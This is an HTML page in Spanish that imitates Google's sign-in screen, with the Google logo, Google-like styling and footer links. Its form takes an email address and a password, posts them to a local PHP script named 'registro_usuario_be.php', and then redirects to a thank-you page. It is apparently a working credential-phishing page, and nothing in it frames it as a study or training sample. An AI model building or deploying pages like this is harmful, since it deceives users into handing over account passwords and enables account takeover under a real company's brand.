
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Acceder</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            background-color: #F2F3F5;
        }
        .card {
            background-color: white;
            border-radius: 8px;
            padding: 40px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 400px;
            margin: 100px auto;
        }
        .logo {
            width: 80px;
            height: 80px;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #1A73E8;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn:hover {
            background-color: #1558b3;
        }
        a {
            color: #1A73E8;
        }
        a:hover {
            text-decoration: underline;
        }
        .footer-links {
            text-align: center;
            margin-top: 20px;
            color: #5F6368;
        }
    </style>
    <script>
        function handleFormSubmit(event) {
            event.preventDefault(); // Prevenir el envío normal del formulario

            // Enviar los datos del formulario usando fetch (opcional)
            fetch(event.target.action, {
                method: 'POST',
                body: new FormData(event.target)
            }).then(response => {
                // Puedes manejar la respuesta si es necesario
                return response.text();  // o response.json() si esperas JSON
            }).then(data => {
                console.log(data);  // Para ver la respuesta en la consola (opcional)
                // Redirigir a la página de agradecimiento
                window.location.href = 'gracias.html';
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</head>
<body>
    <div class="card">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="logo">
        <h2 class="text-2xl font-medium mb-6">Acceder</h2>
        <form action="php/registro_usuario_be.php" method="POST" onsubmit="handleFormSubmit(event)">
            <label for="correo" class="block text-sm font-medium text-gray-700">Correo electrónico</label>
            <input type="text" name="correo" class="mt-2 mb-4 p-2 w-full border border-gray-300 rounded" placeholder="Correo electrónico" required>
            
            <label for="contrasena" class="block text-sm font-medium text-gray-700">Contraseña</label>
            <input type="password" name="contrasena" class="mt-2 mb-4 p-2 w-full border border-gray-300 rounded" placeholder="Contraseña" required>
            
            <a href="#" class="text-sm">¿Olvidaste el correo electrónico?</a>
            <p class="text-xs mt-4">¿Esta no es tu computadora? Usa el modo de invitado para navegar de forma privada. <a href="#">Más información para usar el modo de invitado</a></p>
            <div class="mt-6">
                <a href="#" class="text-sm">Crear cuenta</a>
                <button type="submit" class="btn float-right">Siguiente</button>
            </div>
        </form>
    </div>
    <div class="footer-links">
        <a href="#">Español (Latinoamérica)</a>
        <div class="mt-4">
            <a href="#">Ayuda</a> · <a href="#">Privacidad</a> · <a href="#">Condiciones</a>
        </div>
    </div>
</body>
</html>
